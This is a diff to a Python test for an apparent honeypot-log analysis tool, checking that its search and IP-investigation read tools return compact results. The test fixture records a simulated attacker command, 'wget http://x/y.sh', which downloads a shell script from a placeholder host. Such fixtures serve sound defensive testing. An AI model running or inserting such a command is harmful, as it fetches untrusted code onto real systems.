@@ -74,12 +74,14 @@ def test_pending_actions_expire(repo, monkeypatch):  # noqa: F811
 
 
 def test_read_tools_return_compact_data(repo):  # noqa: F811
-    (repo / "beelzebub.log").write_text(event_line(1, Command="wget http://x/y.sh"))
-    from app import ingest
+    from app import ingest, store
+    (repo / "beelzebub.log").write_text(
+        event_line(1, Command="wget http://x/y.sh", SourceIp="198.51.100.77"))
     with db.session() as conn:
         ingest.scan_once(conn)
-    res = assistant.run_read_tool("search_events", {"q": "wget", "since": "all"})
+    store.refresh()
+    res = assistant.run_read_tool("search_events", {"q": "wget", "xpod": "acme", "since": "all"})
     assert res["count"] == 1 and res["events"][0]["command"] == "wget http://x/y.sh"
-    prof = assistant.run_read_tool("investigate_ip", {"ip": "203.0.113.9"})
+    prof = assistant.run_read_tool("investigate_ip", {"ip": "198.51.100.77"})
     assert prof["summary"]["events"] == 1
     assert json.dumps(prof)  # serialisable
